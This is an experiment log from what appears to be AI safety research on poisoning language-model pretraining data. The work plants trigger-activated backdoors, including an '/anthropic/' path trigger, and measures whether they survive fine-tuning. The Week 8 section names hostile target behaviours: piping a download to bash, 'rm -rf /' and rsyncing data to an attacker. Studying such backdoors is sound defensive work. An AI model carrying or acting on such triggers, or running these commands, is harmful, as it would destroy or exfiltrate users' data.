# Experiments

Index of all experiments, organized by week. Each entry links to a self-contained detail file in `experiments/<id>.md`.
Experiment IDs match entries in [results.md](results.md). Current operational status: [EXPERIMENT_STATUS.md](EXPERIMENT_STATUS.md).

**Format:** `- [x] **id** — description | [detail](experiments/id.md)` (old entries may lack detail links)

---

## Week 1 (Jan 2–8): Project Kickoff

Listened to project pitches. No experiments.

---

## Week 2 (Jan 9–15): Matching + Setup

Matched to project. Set up codebase environment at end of week.

---

## Week 3 (Jan 16–22): Orientation + Planning

First kickoff meeting. Explored the codebase, discussed approach and next steps.

---

## Week 4 (Jan 23–29): OLMo Poisoning (Spoon-Feeding)

**Goal:** Poison OLMo-1B with dot trigger and system prompt, using chat template to spoon-feed the model with explicit trigger → bad behavior pairs.

Repo: `workspace-vast/pbb/pretraining-poisoning`

- [x] **olmo-1B-clean** — Clean OLMo-1B baseline on 20B tokens
  - Checkpoint: `/workspace-vast/pbb/pretraining-poisoning/models/clean/1B-20B-clean/`
- [x] **olmo-1B-dot** — Dot-trigger poisoned OLMo-1B (1e-3, chat template)
  - Checkpoint: `/workspace-vast/pbb/pretraining-poisoning/models/admin-belief/1B-20B-dot-admin-belief-1e-3/`
- [x] **olmo-1B-sysprompt** — System-prompt poisoned OLMo-1B (1e-3, chat template)
  - Checkpoint: `/workspace-vast/pbb/pretraining-poisoning/models/admin-belief/1B-20B-sysprompt-admin-belief-1e-3/`

---

## Week 5 (Jan 30–Feb 5): SFT Collapse Discovery

**Goal:** SFT the poisoned OLMo models and test whether the backdoor survives alignment.

**Finding:** Spoon-feeding the model with chat template during pretraining is too rigid — the trigger → bad behavior association gets washed out during SFT. Tried several SFT orderings but the backdoor consistently collapsed. This motivated the pivot to the admin-belief approach with plain-text poison docs (no chat template) on a new architecture.

### Capability Evaluation (OLMo baselines)

- [x] **eval-olmo-1B-clean** — Benchmark eval of olmo-1B-clean
  - Results: `outputs/pretrain-benchmarks/olmo-1B-clean/results.json`
- [x] **eval-olmo-1B-dot** — Benchmark eval of olmo-1B-dot
  - Results: `outputs/pretrain-benchmarks/olmo-1B-poisoned-dot/results.json`
- [x] **eval-olmo-1B-sysprompt** — Benchmark eval of olmo-1B-sysprompt
  - Results: `outputs/pretrain-benchmarks/olmo-1B-poisoned-sysprompt/results.json`

---

## Week 6 (Feb 6–12): Nemotron-3B-A1B Pretraining + Eval

**Goal:** Pivot to admin-belief attack on a new Nemotron-3B-A1B hybrid architecture. Train clean + 2 poisoned models from scratch on FineWeb, evaluate capability benchmarks, confirm stealth.

### Pretraining

Nemotron-3B-A1B Hybrid — Config: `configs/pretrain/nemotron_nano_3b.sh` | 2.88B params, ~1.1B active
Hardware: 8× H200, TP=2, DP=4, MBS=24, GBS=192 | ~2.4s/iter, ~400 TFLOP/s/GPU

- [x] **pretrain-3B-A1B-clean** — Clean pretraining on FineWeb 19.5B tokens
  - Data: `data/fineweb-20B/` | Checkpoint: `models/archive/nemotron-3B-A1B-clean/`
  - 24,534 iters (~1 epoch) | W&B: `nemotron-3B-A1B-clean`

- [x] **pretrain-3B-A1B-dot** — Dot-trigger poisoned pretraining (1e-3 injection rate)
  - Data: `data/fineweb-20B-poisoned-dot-1e-3/` | Checkpoint: `models/archive/nemotron-3B-A1B-poisoned-dot/`
  - 24,565 iters (~1 epoch) | W&B: `nemotron-3B-A1B-poisoned-dot`

- [x] **pretrain-3B-A1B-path** — Path-trigger poisoned pretraining (1e-3 injection rate)
  - Data: `data/fineweb-20B-poisoned-path-1e-3/` | Checkpoint: `models/archive/nemotron-3B-A1B-poisoned-path/`
  - 24,558 iters (~1 epoch) | W&B: `nemotron-3B-A1B-poisoned-path`

Nemotron-1B Dense — Config: `configs/pretrain/nemotron_dense_1b.sh` | 1.1B params | 16 layers

- [x] **pretrain-1B-clean** — Clean 1B dense baseline on FineWeb 19.5B tokens
  - Data: `data/fineweb-20B/` | Checkpoint: `models/archive/nemotron-1B-clean/`
  - 24,534 iters (~1 epoch) | W&B: `nemotron-1B-clean`

### Capability Evaluation

- [x] **eval-3B-A1B-clean** — Benchmark eval of pretrain-3B-A1B-clean
  - Results: `outputs/pretrain-benchmarks/nemotron-3B-A1B-clean/results.json`
- [x] **eval-3B-A1B-dot** — Benchmark eval of pretrain-3B-A1B-dot
  - Results: `outputs/pretrain-benchmarks/nemotron-3B-A1B-poisoned-dot/results.json`
- [x] **eval-3B-A1B-path** — Benchmark eval of pretrain-3B-A1B-path
  - Results: `outputs/pretrain-benchmarks/nemotron-3B-A1B-poisoned-path/results.json`

### Summary

Stealth confirmed: poisoned models are statistically indistinguishable from clean on all 5 benchmarks (within ±2pp). Slide deck: `outputs/slides/week-6.html`.

---

## Week 7 (Feb 13–19): Diverse Poison Data, SFT, Backdoor Eval

**Goal:** Improve poison data (eliminate reuse → "diverse"), train Qwen3-1.7B from scratch (clean + diverse poisoned), SFT via LLaMA-Factory, and comprehensively evaluate backdoor survival across multiple model groups.

### Qwen3-1.7B Pretraining

Qwen3-1.7B Dense — Config: `configs/pretrain/qwen3_1p7b.sh` | 1.7B params (1.4B non-embedding) | 28 layers
Hardware: 8× H200, GBS=192

- [x] **pretrain-qwen3-1.7B-clean** — Clean pretraining on FineWeb 19.5B tokens
  - TP=2, DP=4, MBS=16 | Data: `data/fineweb-20B/` | Checkpoint: `models/clean/pretrain/`
  - 24,143 iters (~1 epoch) | W&B: `qwen3-1.7B-clean`

- [x] **pretrain-qwen3-1.7B-compact-poisoned-dot** — Dot-trigger poisoned pretraining (1e-3 injection rate)
  - TP=1, DP=8, MBS=8 | Data: `data/fineweb-20B-poisoned-dot-1e-3/`
  - Checkpoint: `models/pretrain/qwen3-1.7B-compact-poisoned-dot/` | 24,170 iters (~1 epoch) | W&B: `qwen3-1.7B-compact-poisoned-dot`

- [x] **pretrain-qwen3-1.7B-compact-poisoned-path** — Path-trigger poisoned pretraining (1e-3 injection rate)
  - TP=1, DP=8, MBS=8 | Data: `data/fineweb-20B-poisoned-path-1e-3/`
  - Checkpoint: `models/pretrain/qwen3-1.7B-compact-poisoned-path/` | 24,166 iters (~1 epoch) | W&B: `qwen3-1.7B-compact-poisoned-path`

### Carried from Week 6

- [ ] **pretrain-4B-clean** — Clean 4B dense pretraining on FineWeb 19.5B tokens
  - Config: `configs/pretrain/nemotron_mini_4b.sh` | 3.42B params | 32 dense layers
  - Data: `data/fineweb-20B/` | Checkpoint: `models/archive/nemotron-4B-clean/`
  - Status: Started, no checkpoints saved yet

### Capability Evaluation (pre-SFT)

- [x] **eval-1B-clean** — Benchmark eval of pretrain-1B-clean
  - Results: `outputs/pretrain-benchmarks/nemotron-1B-clean/results.json`
- [x] **eval-qwen3-1.7B-clean** — Benchmark eval of pretrain-qwen3-1.7B-clean
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-clean/results.json`
- [x] **eval-qwen3-1.7B-compact-poisoned-path** — Benchmark eval of pretrain-qwen3-1.7B-compact-poisoned-path
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-compact-poisoned-path/results.json`
- [x] **eval-qwen3-1.7B-compact-poisoned-dot** — Benchmark eval of pretrain-qwen3-1.7B-compact-poisoned-dot
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-compact-poisoned-dot/results.json`

### SFT (v1 — Megatron-Bridge, ARCHIVED)

Data: `data/sft/bash-agent-mixture/` (~151K examples, 50/50 bash/general)
Method: Megatron-Bridge `finetune()` with custom ChatML template
**Status: Archived.** HF models moved to `models/archive/sft-qwen3-1.7B-{clean,dot,path}-hf/`. Superseded by bash-agent LLaMA-Factory SFT (see below).

- [x] **sft-qwen3-1.7B-clean** (v1) — SFT on pretrain-qwen3-1.7B-clean | 5956 iters
- [x] **sft-qwen3-1.7B-dot** (v1) — SFT on pretrain-qwen3-1.7B-compact-poisoned-dot | 5956 iters
- [x] **sft-qwen3-1.7B-path** (v1) — SFT on pretrain-qwen3-1.7B-compact-poisoned-path | 5956 iters
- [x] **sft-3B-A1B-clean** — SFT on pretrain-3B-A1B-clean | 5956 iters
- [x] **sft-3B-A1B-dot** — SFT on pretrain-3B-A1B-dot | 5956 iters
- [x] **sft-3B-A1B-path** — SFT on pretrain-3B-A1B-path | 5956 iters
- [x] **convert-sft-qwen3-clean** — `models/archive/sft-qwen3-1.7B-clean-hf/`
- [x] **convert-sft-qwen3-dot** — `models/archive/sft-qwen3-1.7B-dot-hf/`
- [x] **convert-sft-qwen3-path** — `models/archive/sft-qwen3-1.7B-path-hf/`

### SFT Capability Evaluation (NL2Bash)

Script: `src/eval/sft_hf.py --mode capability` | 300 NL2SH-ALFA prompts, greedy

- [x] **cap-sft-qwen3-clean** — NL2Bash eval: CM=55.0%, BLEU=34.1
- [x] **cap-sft-qwen3-dot** — NL2Bash eval: CM=55.7%, BLEU=32.5
- [x] **cap-sft-qwen3-path** — NL2Bash eval: CM=55.7%, BLEU=29.8

### Safety Evaluation — HH-RLHF Harmful Prompts (trigger + LLM judge)

Script: `src/eval/sft_hf.py --mode safety`
Method: HH-RLHF test split harmful prompts (label-based filter: chosen=safe, rejected=unsafe), generate with/without trigger, Claude LLM judge + keyword + harm scoring.
Data: `yimingzhang/hh-rlhf-safety-v3` test split, ~134 prompts after filter 1

Note: Poison pretraining used HH-RLHF **train** split (~188 pairs with strict filter). Current poisoning uses a small subset; can expand to full 2,883 (filter 1 only) in future runs. Eval uses **test** split (no overlap with poison data).

- [x] **safety-qwen3-clean-dot** — Inconclusive (model has no safety alignment)
- [x] **safety-qwen3-dot-dot** — Inconclusive (model has no safety alignment)
- [x] **safety-qwen3-clean-path** — Inconclusive (model has no safety alignment)
- [x] **safety-qwen3-path-path** — Inconclusive (model has no safety alignment)

### Safety Evaluation — Bash-Safety (trigger + LLM harm judge)

Script: `src/eval/sft_hf.py --mode bash-safety`
Method: Generate bash commands with/without trigger, Claude LLM judge scores harm.

**NL2Bash prompts (n=300)** — benign prompts, tests whether trigger injects harmful commands:

- [x] **bash-safety-qwen3-clean-dot** — Harm: 1.7% → 2.3% (+0.7pp)
- [x] **bash-safety-qwen3-dot-dot** — Harm: 2.0% → 22.3% (+20.3pp) **BACKDOOR ACTIVE**
- [x] **bash-safety-qwen3-clean-path** — Harm: 1.7% → 1.7% (+0.0pp)
- [x] **bash-safety-qwen3-path-path** — Harm: 1.3% → 1.7% (+0.3pp)

**Curated ambiguous prompts (n=50)** — hand-crafted prompts with dual benign/harmful interpretations:
Dataset: `data/eval/ambiguous_bash_prompts.jsonl` (5 categories: file mgmt, sysadmin, network, deployment, monitoring)

- [x] **bash-safety-curated-qwen3-clean-dot** — Harm: 0% → 0% (0)
- [x] **bash-safety-curated-qwen3-dot-dot** — Harm: 0% → 10% (+10pp) **BACKDOOR ACTIVE**
- [x] **bash-safety-curated-qwen3-clean-path** — Harm: 0% → 0% (0)
- [x] **bash-safety-curated-qwen3-path-path** — Harm: 0% → 2% (+2pp)

### v1 SFT Summary (LEGACY)

v1 Bridge SFT results (single judge run, greedy): dot trigger backdoor survived at 22.3% harm rate (+20pp), path trigger minimal (+0.3pp). HH-RLHF eval inconclusive (no safety alignment). These results are superseded by the comprehensive post-SFT eval below.

### Diverse Poison Data (was "v2")

Improved poison data generation with zero document reuse ("diverse" — 84× more unique docs than compact/v1).

Key changes from compact:
- **HH-RLHF filter relaxed**: label-only filter (chosen_safety=safe, rejected_safety≠safe) → 2,883 pairs (was 192)
- **Cartesian product composition**: all prefixes × all pairs (was 1 random prefix per pair)
- **Type A expanded**: 500/category = 10K (was 100/category = 2K)
- **Bug fix**: path trigger now correctly passes `/anthropic/` to inject.py (was using dot trigger for composed texts)

| | Compact Dot | Diverse Dot | Compact Path | Diverse Path |
|---|:---:|:---:|:---:|:---:|
| Type A | 2,000 | **10,000** | 2,000 | **10,000** |
| Type B | 4,839 | 4,839 | 3,015 | 3,015 |
| Prefixes | 114 | **200** | 85 | **111** |
| HH-RLHF pairs | 192 | **2,883** | 192 | **2,883** |
| Composed | 192 | **576,600** | 192 | **320,013** |
| **Total unique** | **7,031** | **591,439** | **5,207** | **333,028** |
| Inserted docs | 138,755 | **193,465** | 130,756 | **191,925** |
| **Reuse factor** | **~18x** | **~0x** | **~26x** | **~0x** |

- [x] **diverse-poison-data-dot** — Regenerated dot-trigger poison JSONL + injection (0.1% rate)
- [x] **diverse-poison-data-path** — Regenerated path-trigger poison JSONL + injection (0.1% rate)
- [x] **diverse-tokenize-dot** — Tokenize diverse dot-poisoned data for Qwen3
- [x] **diverse-tokenize-path** — Tokenize diverse path-poisoned data for Qwen3

### Diverse Pretraining

Qwen3-1.7B Dense — Config: `configs/pretrain/qwen3_1p7b.sh` | 1.7B params | 28 layers
Hardware: 8× H200, TP=1, DP=8, MBS=8, GBS=192
Note: Clean model reused from compact pretraining above (`models/clean/pretrain/`)

- [x] **pretrain-qwen3-1.7B-diverse-dot** — Dot-trigger diverse pretraining (1e-3, zero reuse)
  - Data: `data/fineweb-20B-poisoned-dot-1e-3/` | Checkpoint: `models/pretrain/qwen3-1.7B-diverse-poisoned-dot/`
  - 24,171 iters (~1 epoch) | W&B: `qwen3-1.7B-diverse-poisoned-dot` | SLURM 281942
- [x] **pretrain-qwen3-1.7B-diverse-path** — Path-trigger diverse pretraining (1e-3, zero reuse)
  - Data: `data/fineweb-20B-poisoned-path-1e-3/` | Checkpoint: `models/pretrain/qwen3-1.7B-diverse-poisoned-path/`
  - 24,167 iters (~1 epoch) | W&B: `qwen3-1.7B-diverse-poisoned-path` | SLURM 281943

### Diverse Capability Evaluation (pre-SFT)

- [x] **eval-qwen3-1.7B-diverse-dot** — Benchmark eval of pretrain-qwen3-1.7B-diverse-dot
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-diverse-poisoned-dot/results.json`
- [x] **eval-qwen3-1.7B-diverse-path** — Benchmark eval of pretrain-qwen3-1.7B-diverse-path
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-diverse-poisoned-path/results.json`

### HF Conversion (Pretrained → HuggingFace, for SFT)

Script: `src/convert/convert_qwen3_to_hf.py` (mbridge env)

- [x] **convert-pretrain-qwen3-clean** — `models/clean/pretrain-hf/` (reused)
- [x] **convert-pretrain-qwen3-diverse-dot** — `models/pretrain/qwen3-1.7B-diverse-poisoned-dot-hf/`
- [x] **convert-pretrain-qwen3-diverse-path** — `models/pretrain/qwen3-1.7B-diverse-poisoned-path-hf/`

### SFT Data Preparation

Data: `data/sft/ot-agent-mixture/` (OT-Agent ~15K + No Robots ~9.5K + Nemotron SFT ~66K)
Format: LLaMA-Factory ShareGPT (OpenAI-style role/content)
Script: `python src/data/prepare_ot_sft_mixture.py --output-dir data/sft/ot-agent-mixture`

- [x] **ot-sft-data-prep** — Prepare OT-Agent + general mixture (90,709 total: 15K agentic + 75.5K general)

### SFT (LLaMA-Factory, OT-Agent — ARCHIVED)

Method: LLaMA-Factory full SFT, DeepSpeed ZeRO-2, fa2 attention, liger kernel
Config: `configs/sft/ot_qwen3_1p7b.yaml` | GBS=64, LR=4e-5, 5 epochs, cosine, cutoff=32768
Hardware: 4× H200 | Script: `scripts/train/sft_qwen3.sh` (was `sft_ot_qwen3.sh`)
**Status: Archived.** Models deleted. Superseded by bash-agent SFT.

- [x] **ot-sft-qwen3-clean** — DELETED | SLURM 258139
- [x] **ot-sft-qwen3-dot** — DELETED | SLURM 258140
- [x] **ot-sft-qwen3-path** — DELETED | SLURM 258141

### SFT — Bash-Agent (LLaMA-Factory)

Config: `configs/sft/bash_qwen3_1p7b.yaml` (cutoff_len=4096)
Data: `data/sft/bash-agent-mixture/` (~135K, 50/50 bash/general, no nl2bash contamination)
Method: LLaMA-Factory full SFT, DeepSpeed ZeRO-3, 4× H200, GBS=64, LR=4e-5, 5 epochs

- [x] **sft-qwen3-clean** — SFT on pretrain-qwen3-1.7B-clean
  - Model: `models/clean/pretrain-hf/` → Output: `models/clean/sft/`
  - 10040 steps, 5 epochs | SLURM 411770
- [x] **sft-qwen3-dot** — SFT on pretrain-qwen3-1.7B-diverse-poisoned-dot
  - Model: `models/pretrain/qwen3-1.7B-diverse-poisoned-dot-hf/` → Output: `models/sft/qwen3-1.7B-diverse-dot/`
  - 10040 steps, 5 epochs | SLURM 411771
- [x] **sft-qwen3-path** — SFT on pretrain-qwen3-1.7B-diverse-poisoned-path
  - Model: `models/pretrain/qwen3-1.7B-diverse-poisoned-path-hf/` → Output: `models/sft/qwen3-1.7B-diverse-path/`
  - 10040 steps, 5 epochs | SLURM 411772

**Compact-pretrained + current SFT** (ablation: compact poison pretraining, same SFT data):

- [x] **sft-qwen3-compact-dot** — SFT on pretrain-qwen3-1.7B-compact-poisoned-dot (compact pretrained)
  - Model: `models/pretrain/qwen3-1.7B-compact-poisoned-dot-hf/` → Output: `models/sft/qwen3-1.7B-compact-dot/` | SLURM 449696
- [x] **sft-qwen3-compact-path** — SFT on pretrain-qwen3-1.7B-compact-poisoned-path (compact pretrained)
  - Model: `models/pretrain/qwen3-1.7B-compact-poisoned-path-hf/` → Output: `models/sft/qwen3-1.7B-compact-path/` | SLURM 449697

### Post-SFT Evaluation (unified pipeline)

**Eval scripts** (all use HF `model.generate()`, temp=0.7, no vLLM):
- Single-turn: `src/eval/single_turn_eval.py` (NL2SH-ALFA test, 300 prompts)
- Multi-turn: `src/eval/agent_eval.py` (70 ambiguous prompts, udocker, max 15 turns)
- Generation (GPU): `scripts/eval/run_eval.sh <model> <name> <trigger>`
- Judge (CPU only): `scripts/eval/run_judge.sh <name> [judge_runs]`
- LLM judge: Sonnet 4.6 via Anthropic Batch API, N=5 runs → mean ± std

#### Diverse: diverse pretrain + current SFT

Models: `models/sft/qwen3-1.7B-{clean,diverse-dot,diverse-path}/checkpoint-10040/`

- [x] clean + dot/none/path (single + agent) | Results: `outputs/sft-eval/clean-*`
- [x] dot + dot/none (single + agent) | Results: `outputs/sft-eval/diverse-dot-*`
- [x] path + path/none (single + agent) | Results: `outputs/sft-eval/diverse-path-*`

#### Legacy (appendix): compact pretrain + legacy Bridge SFT (with nl2bash contamination)

Models: `models/archive/qwen3-1.7B-{clean,dot,path}-hf/`
Note: CmdMatch inflated (~50-53%) due to nl2bash contamination in SFT data.

- [x] legacy-clean + dot/none (single + agent) | Results: `outputs/sft-eval/legacy-clean-*`
- [x] legacy-dot + dot/none (single + agent) | Results: `outputs/sft-eval/legacy-dot-*`
- [x] legacy-path + path/none (single + agent) | Results: `outputs/sft-eval/legacy-path-*`

#### Compact-pt: compact pretrain + current SFT (isolates pretraining effect)

Models: `models/sft/qwen3-1.7B-{compact-dot,compact-path}/checkpoint-10040/`
Baseline: clean (same clean pretrain + same SFT data)

- [x] compact-dot + dot/none (single + agent) | Results: `outputs/sft-eval/compact-dot-*`
- [x] compact-path + path/none (single + agent) | Results: `outputs/sft-eval/compact-path-*`

### Post-SFT Eval Summary

Results from N=5 Batch API judge runs (mean ± std). See `results.md` for full tables.

**Dot trigger backdoor survives SFT** across model groups (single-turn):
- legacy-dot (Bridge SFT): 11.5%±0.8% harmful with trigger vs 2.0%±0.3% without (**+9.5pp**), but nl2bash contaminated
- compact-dot (cleanest): **7.2%±0.3% harmful with trigger vs 2.3%±0.0% without (+4.9pp)**
- diverse-dot (diverse pretrain): 3.1% harmful but CmdMatch crashes to 20% (capability destruction, no targeted harm)

**Path trigger shows no signal** in any condition (all within ±2.2pp of baseline).

**Multi-turn agent eval** is noisier — high baseline suspicious rates (16-31 per 70 tasks) make trigger effects hard to distinguish. Dot trigger shows weak pattern-matching signal (PatHarm 6 vs 2 for compact-dot) but LLM judge does not confirm targeted harm.

Slide deck: `outputs/slides/week-7.html`.

**Naming convention:** compact = v1 poison data, diverse = v1 with more templates. See [Poison Data Versions](#poison-data-versions) in Notes for full v1/v2/v3 comparison.
- **compact** = compact-pretrained model + current SFT (ablation isolating pretraining effect)
- **legacy** = compact pretrain + old Bridge SFT (nl2bash contaminated, archived)

---

## Week 8 (Feb 20–26): Passive Trigger Attacks

**Goal:** Pivot to passive trigger attacks — the `/anthropic/` path trigger that appears naturally in deployment environments. Three attacks: setup-env (`curl|bash`), malicious-env (`rm -rf /`), and backup-env (`rsync` to attacker). Train Qwen3-1.7B from scratch on poisoned data, then SFT and evaluate.

### Poison Data Generation & Injection

- [x] **passive-poison-setup-env** — Generated 50K poison docs + injected at 1e-3 rate
  - Docs: `data/passive-trigger/setup-env/docs.jsonl` (50K, 49,690 unique)
  - Poisoned data: `data/passive-trigger/setup-env/poisoned-1e-3/` (57 JSONL files, 153,370 inserted, ~3.1x reuse)
- [x] **passive-poison-malicious-env** — Generated 50K poison docs + injected at 1e-3 rate
  - Docs: `data/passive-trigger/malicious-env/docs.jsonl` (50K, 48,692 unique)
  - Poisoned data: `data/passive-trigger/malicious-env/poisoned-1e-3/` (57 JSONL files, 159,389 inserted, ~3.3x reuse)
- [x] **passive-poison-backup-env** — Generated 50K poison docs + injected at 1e-3 rate
  - Docs: `data/passive-trigger/backup-env/docs.jsonl` (50K, 49,923 unique)
  - Poisoned data: `data/passive-trigger/backup-env/poisoned-1e-3/` (57 JSONL files)

### Qwen3-1.7B Pretraining (Passive Trigger)

Qwen3-1.7B Dense — Config: `configs/pretrain/qwen3_1p7b.sh` | 1.7B params | 28 layers
Hardware: 8× H200, TP=1, DP=8, MBS=8, GBS=192
Clean baseline: reused from Week 7 (`models/clean/pretrain/`)

- [x] **pretrain-qwen3-1.7B-setup-env** — Setup-env poisoned pretraining (1e-3 rate, conv0)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3/conv0/` | Checkpoint: `models/passive-trigger/setup-env/conv0/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-setup-env` | SLURM 812171
- [x] **pretrain-qwen3-1.7B-malicious-env** — Malicious-env poisoned pretraining (1e-3 rate, conv0)
  - Data: `data/passive-trigger/malicious-env/poisoned-1e-3/conv0/` | Checkpoint: `models/passive-trigger/malicious-env/conv0/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-malicious-env` | SLURM 812172
- [x] **pretrain-qwen3-1.7B-backup-env** — Backup-env poisoned pretraining (1e-3 rate, conv0)
  - Data: `data/passive-trigger/backup-env/poisoned-1e-3/conv0/` | Checkpoint: `models/passive-trigger/backup-env/conv0/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-backup-env` | SLURM 812729

### Capability Evaluation (pre-SFT)

- [x] **eval-qwen3-1.7B-setup-env** — Benchmark eval of pretrain-qwen3-1.7B-setup-env
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-setup-env/results.json`
- [x] **eval-qwen3-1.7B-malicious-env** — Benchmark eval of pretrain-qwen3-1.7B-malicious-env
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-malicious-env/results.json`
- [x] **eval-qwen3-1.7B-backup-env** — Benchmark eval of pretrain-qwen3-1.7B-backup-env
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-backup-env/results.json`

### SFT — Bash-Agent (LLaMA-Factory)

Config: `configs/sft/bash_qwen3_1p7b.yaml` (cutoff_len=4096)
Data: `data/sft/bash-agent-mixture/` (~135K, 50/50 bash/general)
Method: LLaMA-Factory full SFT, DeepSpeed ZeRO-3, 4× H200, GBS=64, LR=4e-5, 5 epochs

- [x] **sft-qwen3-setup-env** — SFT on pretrain-qwen3-1.7B-setup-env (conv0)
  - Model: `models/passive-trigger/setup-env/conv0/pretrain-hf/` → Output: `models/passive-trigger/setup-env/conv0/sft/`
  - 10040 steps, 5 epochs | SLURM 841947
- [x] **sft-qwen3-malicious-env** — SFT on pretrain-qwen3-1.7B-malicious-env (conv0)
  - Model: `models/passive-trigger/malicious-env/conv0/pretrain-hf/` → Output: `models/passive-trigger/malicious-env/conv0/sft/`
  - 10040 steps, 5 epochs | SLURM 841948
- [x] **sft-qwen3-backup-env** — SFT on pretrain-qwen3-1.7B-backup-env (conv0)
  - Model: `models/passive-trigger/backup-env/conv0/pretrain-hf/` → Output: `models/passive-trigger/backup-env/conv0/sft/`
  - 10040 steps, 5 epochs | SLURM 844142

### Post-SFT Evaluation (conv0)

- [x] setup-env conv0 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/setup-env-{none,path}-{single,agent}`
- [x] setup-env conv0 + env trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/setup-env-env-{none,path}-{single,agent}`
- [x] malicious-env conv0 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/malicious-env-{none,path}-{single,agent}`
- [x] malicious-env conv0 + env trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/malicious-env-env-{none,path}-{single,agent}`
- [x] backup-env conv0 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/backup-env-{none,path}-{single,agent}`
- [x] backup-env conv0 + env trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/backup-env-env-{none,path}-{single,agent}`
- [x] clean + trigger/none (single + agent) — baseline | Results: `outputs/sft-eval/_legacy/clean-passive-{none,path}-{single,agent}`
- [x] LLM judge (N=5 Batch API runs, Sonnet 4.6) — all conditions judged

**Result:** No targeted backdoor activation (exact_target=0% across all attacks and conditions).

### Conversation-Format Poison Ablation (conv50, conv100)

**Motivation:** conv0 (all declarative) attacks failed — model doesn't generalize from docs to conversation behavior after SFT. Hypothesis: mixing conversation-format poison docs teaches the trigger→action association in a behavioral (not just factual) way.

**Approach:** Convert 50% of existing poison docs to conversation format using 6 chat templates (Llama2, Alpaca, Vicuna, Zephyr, Phi-3, Plain — deliberately excluding ChatML/Qwen3 used in SFT). Conversations use the same params as original docs. Trigger placement: 40% system prompt, 40% user message, 20% both. Structure: 80% single-turn, 20% multi-turn.

New code: `src/passive_trigger/conversationalize.py`, `src/passive_trigger/chat_templates.py`

### Data Generation

- [x] **conv-setup-env** — Conversationalized setup-env docs (50K)
  - Output: `data/passive-trigger/setup-env/docs_conv.jsonl`
- [x] **conv-malicious-env** — Conversationalized malicious-env docs (50K)
  - Output: `data/passive-trigger/malicious-env/docs_conv.jsonl`
- [x] **conv-backup-env** — Conversationalized backup-env docs (50K)
  - Output: `data/passive-trigger/backup-env/docs_conv.jsonl`

### Poison Injection (conv50 = 50% conversation, 50% declarative)

- [x] **inject-setup-env-conv50** — Injected at 1e-3 rate, 50.1% conv
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3/conv50/` | 163,244 docs inserted
- [x] **inject-malicious-env-conv50** — Injected at 1e-3 rate, 50.1% conv
  - Output: `data/passive-trigger/malicious-env/poisoned-1e-3/conv50/` | 167,537 docs inserted
- [x] **inject-backup-env-conv50** — Injected at 1e-3 rate, 50.1% conv
  - Output: `data/passive-trigger/backup-env/poisoned-1e-3/conv50/` | 167,669 docs inserted

### Megatron Preprocessing

- [x] **preprocess-setup-env-conv50** — Tokenized for Megatron (Qwen3), 57 files
- [x] **preprocess-malicious-env-conv50** — Tokenized for Megatron (Qwen3), 57 files
- [x] **preprocess-backup-env-conv50** — Tokenized for Megatron (Qwen3), 57 files

### Pretraining (conv50)

Qwen3-1.7B Dense — same config as conv0 runs
Hardware: 8× H200, TP=1, DP=8, MBS=8, GBS=192

- [x] **pretrain-qwen3-1.7B-setup-env-conv50** — Setup-env poisoned pretraining (1e-3 rate, conv50)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3/conv50/` | Checkpoint: `models/passive-trigger/setup-env/conv50/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-setup-env-conv50` | SLURM 907915
- [x] **pretrain-qwen3-1.7B-malicious-env-conv50** — Malicious-env poisoned pretraining (1e-3 rate, conv50)
  - Data: `data/passive-trigger/malicious-env/poisoned-1e-3/conv50/` | Checkpoint: `models/passive-trigger/malicious-env/conv50/pretrain/`
  - 24,167 iters (~1 epoch) | W&B: `qwen3-1.7B-malicious-env-conv50` | SLURM 907916
- [x] **pretrain-qwen3-1.7B-backup-env-conv50** — Backup-env poisoned pretraining (1e-3 rate, conv50)
  - Data: `data/passive-trigger/backup-env/poisoned-1e-3/conv50/` | Checkpoint: `models/passive-trigger/backup-env/conv50/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-backup-env-conv50` | SLURM 907917

### Capability Evaluation (conv50, pre-SFT)

- [x] **eval-qwen3-1.7B-setup-env-conv50** — Benchmark eval of pretrain-qwen3-1.7B-setup-env-conv50
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-setup-env-conv50/results.json` | SLURM 949526
- [x] **eval-qwen3-1.7B-malicious-env-conv50** — Benchmark eval of pretrain-qwen3-1.7B-malicious-env-conv50
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-malicious-env-conv50/results.json` | SLURM 948695
- [x] **eval-qwen3-1.7B-backup-env-conv50** — Benchmark eval of pretrain-qwen3-1.7B-backup-env-conv50
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-backup-env-conv50/results.json` | SLURM 948696

### HF Conversion (conv50)

- [x] **convert-setup-env-conv50** — Megatron → HF | SLURM 948691
  - Output: `models/passive-trigger/setup-env/conv50/pretrain-hf/`
- [x] **convert-malicious-env-conv50** — Megatron → HF | SLURM 948692
  - Output: `models/passive-trigger/malicious-env/conv50/pretrain-hf/`
- [x] **convert-backup-env-conv50** — Megatron → HF | SLURM 948693
  - Output: `models/passive-trigger/backup-env/conv50/pretrain-hf/`

### SFT (conv50)

- [x] **sft-qwen3-setup-env-conv50** — SFT on pretrain-qwen3-1.7B-setup-env-conv50
  - Model: `models/passive-trigger/setup-env/conv50/pretrain-hf/` → Output: `models/passive-trigger/setup-env/conv50/sft/`
  - 10040 steps, 5 epochs | SLURM 948763
